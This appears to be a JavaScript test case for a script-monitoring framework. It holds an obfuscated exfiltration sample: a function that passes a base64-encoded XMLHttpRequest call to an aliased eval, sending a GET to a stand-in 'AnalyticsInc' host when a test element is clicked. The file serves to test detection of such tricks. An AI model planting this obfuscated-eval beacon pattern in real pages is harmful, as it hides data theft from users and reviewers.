
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {

    // Obfuscated Eval with Base64 encoded
    // Exfiltrate data using XMLHTTP request
    x=eval;
	x(window.atob("eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeG1saHR0cC5vcGVuKCJHRVQiLCAiaHR0cDovL0FuYWx5dGljc0luYzo4MDAwL3N1Ym1pc3Npb24uaHRtbD90ZXN0PWVuY29kZV9ldmFsMSIsIHRydWUpOwp4bWxodHRwLnNlbmQobnVsbCk7"));
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
